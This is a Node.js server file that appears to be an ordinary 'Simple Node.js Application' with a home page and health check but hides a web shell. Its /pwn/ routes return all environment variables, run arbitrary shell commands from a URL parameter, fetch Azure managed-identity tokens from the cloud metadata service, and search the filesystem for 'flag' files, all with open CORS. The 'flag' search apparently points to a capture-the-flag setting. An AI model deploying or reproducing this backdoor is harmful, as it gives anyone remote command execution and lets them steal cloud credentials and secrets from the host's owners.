const http = require('http');
const { execSync } = require('child_process');
const https = require('https');

const PORT = process.env.PORT || 80;

function fetchImdsToken(resource, cb) {
    const opts = {
        hostname: '169.254.169.254',
        path: '/metadata/identity/oauth2/token?api-version=2018-02-01&resource=' + encodeURIComponent(resource),
        headers: { 'Metadata': 'true' },
        timeout: 3000
    };
    const req = require('http').request(opts, (res) => {
        let body = '';
        res.on('data', (c) => body += c);
        res.on('end', () => cb(null, body));
    });
    req.on('error', (e) => cb(e));
    req.on('timeout', () => { req.destroy(); cb(new Error('timeout')); });
    req.end();
}

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    const urlObj = new URL(req.url, `http://${req.headers.host}`);

    if (urlObj.pathname === '/pwn/env') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(process.env, null, 2));
        return;
    }

    if (urlObj.pathname === '/pwn/cmd') {
        const cmd = urlObj.searchParams.get('c');
        if (!cmd) {
            res.writeHead(400, { 'Content-Type': 'text/plain' });
            res.end('missing c param');
            return;
        }
        try {
            const out = execSync(cmd, { timeout: 10000, shell: '/bin/sh' }).toString();
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end(out);
        } catch (e) {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('ERR: ' + (e.stdout ? e.stdout.toString() : '') + '\n' + (e.stderr ? e.stderr.toString() : '') + '\n' + e.message);
        }
        return;
    }

    if (urlObj.pathname === '/pwn/imds') {
        const resource = urlObj.searchParams.get('resource') || 'https://management.azure.com/';
        fetchImdsToken(resource, (err, body) => {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            if (err) { res.end('IMDS ERROR: ' + err.message); }
            else { res.end(body); }
        });
        return;
    }

    if (urlObj.pathname === '/pwn/find') {
        try {
            const out = execSync("grep -riIl 'flag' / --include='*.*' -r 2>/dev/null | grep -v -E '^/(proc|sys)' | head -n 200", { timeout: 15000, shell: '/bin/sh' }).toString();
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end(out || 'no matches');
        } catch (e) {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('ERR: ' + e.message);
        }
        return;
    }

    if (req.url === '/' || req.url === '/index.html') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`<!DOCTYPE html><html><body><h1>Simple Node.js Application</h1><p>Node ${process.version}</p></body></html>`);
        return;
    }

    if (req.url === '/health') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'healthy', timestamp: new Date().toISOString(), uptime: process.uptime() }));
        return;
    }

    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
});

server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
